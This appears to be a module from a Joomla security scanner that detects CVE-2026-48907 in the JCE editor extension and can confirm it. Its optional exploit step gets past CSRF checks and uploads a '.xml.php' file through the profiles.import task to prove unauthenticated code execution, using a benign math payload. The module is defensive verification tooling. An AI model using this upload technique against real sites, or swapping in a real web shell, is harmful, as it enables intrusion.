from __future__ import annotations

import re

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import HttpSession, normalize_url, poll_paths
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import CSRF_CANDIDATE_PATHS, extract_csrf_from_html, rand_str
from ...core.versions import version_lt

CVE_ID = "CVE-2026-48907"
NAME = "JCE Extension unauthenticated arbitrary file upload to RCE"
COMPONENT = "JCE Editor Extension"
PATCHED_VERSION = "2.9.99.5"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = f"{COMPONENT} < {PATCHED_VERSION}"


def probe_jce(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict:
    sess = HttpSession(normalize_url(target_url), timeout=timeout, proxy=proxy)
    result = {"found": False, "version": None}
    manifests = [
        "/plugins/editors/jce/jce.xml",
        "/administrator/components/com_jce/jce.xml",
    ]
    for path in manifests:
        resp = sess.get(path, timeout=6)
        body = resp.get("body", "") if resp else ""
        if resp and resp.get("status") == 200 and re.search(r"jce|com_jce|wf_editor|jcemediabox", body, re.IGNORECASE):
            match = re.search(r"<version>([^<]+)</version>", body, re.IGNORECASE)
            if match:
                return {"found": True, "version": match.group(1).strip()}
            result["found"] = True

    fingerprints = [
        "/plugins/system/jcemediabox/js/jcemediabox.js",
        "/plugins/system/jce/css/content.css",
        "/media/editors/jce/js/editor.min.js",
        "/index.php?option=com_jce&task=explorer",
    ]
    for path in fingerprints:
        resp = sess.get(path, timeout=6)
        body = resp.get("body", "") if resp else ""
        if resp and resp.get("status") == 200 and re.search(r"jce|wf_editor|jcemediabox|tinymce", body, re.IGNORECASE):
            result["found"] = True
    return result


def passive_check(target_url: str, joomla_version: str | None, timeout: int = 12, proxy: str | None = None) -> Finding:
    jce = probe_jce(target_url, timeout=timeout, proxy=proxy)
    jce_version = jce.get("version")

    if not jce["found"]:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="HIGH",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="JCE was not detected on the target via standard editor paths or manifests.",
            action="Component not detected via standard public routes; verify manually if installed in non-standard location.",
        )

    if jce_version and version_lt(jce_version, PATCHED_VERSION):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=jce_version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=(
                f"JCE {jce_version} is older than {PATCHED_VERSION}. "
                f"Joomla version from ProofCMS native scanner: {joomla_version or 'unknown'}."
            ),
            action=f"Upgrade JCE to {PATCHED_VERSION} or later.",
        )

    if jce_version:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="PATCHED",
            confidence="HIGH",
            component=COMPONENT,
            component_version=jce_version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"JCE {jce_version} is {PATCHED_VERSION} or later.",
            action=f"Keep JCE at {PATCHED_VERSION} or later.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="INCONCLUSIVE",
        confidence="MEDIUM",
        component=COMPONENT,
        component_version=None,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail="JCE was detected, but its version could not be determined.",
        action=f"Manually verify JCE and upgrade to {PATCHED_VERSION} or later if needed.",
    )


def _extract_csrf(sess: HttpSession) -> tuple[str | None, str | None, list[str]]:
    checked = []
    for path in CSRF_CANDIDATE_PATHS:
        resp = sess.get(path)
        checked.append(f"{path}:{resp.get('status') if resp else 0}")
        if not resp or resp.get("status") not in (200, 301, 302, 303):
            continue
        token = extract_csrf_from_html(resp.get("body", ""))
        if token:
            return token, path, checked
    return None, None, checked


def run_exploit(
    target_url: str,
    joomla_version: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    target_url = normalize_url(target_url)
    sess = HttpSession(target_url, timeout=timeout, proxy=proxy)
    passive = passive_check(target_url, joomla_version, timeout=timeout, proxy=proxy)

    if passive.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        passive.detail += " Exploit verification skipped because passive validation did not indicate a vulnerable JCE version."
        return passive

    token, token_source, checked_token_paths = _extract_csrf(sess)
    if not token:
        passive.detail += (
            " Exploit verification was requested but skipped because no Joomla CSRF token was found "
            "in homepage, common form pages, or administrator login. "
            f"Checked token paths: {', '.join(checked_token_paths)}."
        )
        return passive

    payload, expected = generate_php_math_payload()
    filename = f"jvh-{rand_str(6)}.xml.php"

    upload = sess.post(
        "/index.php?option=com_jce",
        fields={"task": "profiles.import", token: "1"},
        files={"profile_file": (filename, payload.encode("utf-8"), "application/xml")},
    )
    passive.exploit_ran = True
    if not upload or upload.get("status") != 200:
        passive.status = "NOT_CONFIRMED"
        passive.confidence = "MEDIUM"
        passive.detail += (
            " Exploit verification reached the upload step but upload did not succeed. "
            f"CSRF token source: {token_source}; upload status: {upload.get('status') if upload else 0}."
        )
        return passive

    passive.uploaded_filename = filename
    base_root = sess.base_url or target_url
    candidate_paths = [f"/tmp/{filename}", f"/{filename}"]
    resp, found_path, attempts = poll_paths(
        lambda p: sess.get(p, timeout=8),
        candidate_paths,
        deadline=3.0,
        initial_delay=0.1,
    )
    if resp and resp.get("status") == 200 and found_path:
        proof_url = f"{base_root}{found_path}"
        body = resp.get("body", "")
        is_exec, is_source = verify_php_execution(body, expected)
        if is_exec:
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="VULNERABLE",
                confidence="CONFIRMED",
                component=COMPONENT,
                component_version=passive.component_version,
                affected_rule=AFFECTED_RULE,
                exploit_available=HAS_EXPLOIT,
                exploit_ran=True,
                proof_url=proof_url,
                uploaded_filename=filename,
                detail=f"RCE confirmed with dynamic runtime math proof ({expected}) after {attempts} attempt(s). Uploaded proof file must be deleted.",
                action=f"Upgrade JCE to {PATCHED_VERSION} or later and delete {filename}.",
            )
        if is_source or body:
            passive.status = "VULNERABLE_UPLOAD_ONLY"
            passive.confidence = "HIGH"
            passive.proof_url = proof_url
            passive.detail = (
                f"A proof file was uploaded (verified in {attempts} attempt(s)), but PHP execution was not confirmed "
                "(source served or execution blocked). Uploaded proof file must be deleted."
            )
            passive.action = f"Upgrade JCE to {PATCHED_VERSION} or later and delete {filename}."
            return passive

    passive.status = "NOT_CONFIRMED"
    passive.confidence = "MEDIUM"
    passive.detail += (
        f" Upload appeared to succeed, but the proof file was not reachable after {attempts} attempt(s) in checked locations "
        f"(/tmp/{filename}, /{filename}). This does not confirm RCE and may mean the file was "
        f"discarded, renamed, stored elsewhere, or blocked from public access. CSRF token source: {token_source}."
    )
    passive.action = (
        f"Upgrade JCE to {PATCHED_VERSION} or later. If {filename} exists anywhere on disk, delete it."
    )
    return passive


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    if run_exploit_check:
        if exploit_mode != "safe":
            result = passive_check(target_url, joomla_version, timeout=timeout, proxy=proxy)
            result.detail += " This CVE module only supports safe exploit verification."
            return result
        return run_exploit(target_url, joomla_version=joomla_version, timeout=timeout, proxy=proxy)
    return passive_check(target_url, joomla_version, timeout=timeout, proxy=proxy)


def affects_joomla_version(joomla_version: str | None) -> bool:
    return "*" in AFFECTED_JOOMLA_VERSIONS


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.2.0",
        "last_reviewed": "2026-03-20",
        "updated": "2026-03-20",
        "required_detectors": [],
        "references": [
            "https://www.joomlacontenteditor.net/news/item/jce-pro-2982-released",
            "Project baseline rule: JCE Editor < 2.9.99.5 (conservative cutoff preventing false PATCHED classifications)",
        ],
    }
